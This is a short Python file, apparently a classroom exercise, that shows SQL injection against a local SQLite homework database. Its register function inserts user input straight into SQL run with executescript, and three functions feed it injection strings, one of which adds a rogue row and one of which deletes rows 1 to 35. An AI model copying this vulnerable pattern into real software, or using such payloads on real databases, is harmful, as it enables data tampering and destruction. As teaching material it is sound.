import sqlite3


def register(username: str, password: str) -> None:
    with sqlite3.connect("../homework.db") as conn:
        cursor = conn.cursor()
        cursor.executescript(
            f"""
            INSERT INTO `table_users` (username, password)
            VALUES ('{username}', '{password}')  
            """
        )
        conn.commit()


def hack() -> None:
    username: str = "I like', 'i_hack_your_password'); --"
    password: str = "SQL Injection"
    register(username, password)


def hack2() -> None:
    username: str = "i_like"
    password: str = (
        "sql_injection'); insert into table_users (username, password) values ('я тебя', 'взломал'); --"
    )
    register(username, password)


def hack3() -> None:
    username: str = "i_like"
    password: str = (
        "sql_injection'); delete from table_users where id BETWEEN 1 AND 35; --"
    )
    register(username, password)


if __name__ == "__main__":
    # register('wignorbo', 'sjkadnkjasdnui31jkdwq')
    hack()
    hack2()
    hack3()
